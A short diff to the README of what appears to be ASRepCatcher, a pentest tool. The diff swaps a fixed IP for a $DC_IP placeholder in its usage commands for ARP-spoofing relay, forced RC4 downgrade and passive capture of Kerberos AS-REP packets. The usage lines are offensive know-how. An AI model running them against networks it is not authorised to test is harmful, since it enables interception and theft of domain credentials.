@@ -73,10 +73,10 @@ Moreover, the tool <ins>forces client workstations to use RC4</ins> by altering 
 
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
-ASRepCatcher.py relay -dc 192.168.1.100 --keep-spoofing
+ASRepCatcher.py relay -dc $DC_IP --keep-spoofing
 
 # Disabling ARP spoofing, the mitm position is obtained differently
-ASRepCatcher.py relay -dc 192.168.1.100 --disable-spoofing
+ASRepCatcher.py relay -dc $DC_IP --disable-spoofing
 
 # Passive listening for AS-REP packets, no packet alteration
 ASrepCatcher.py listen
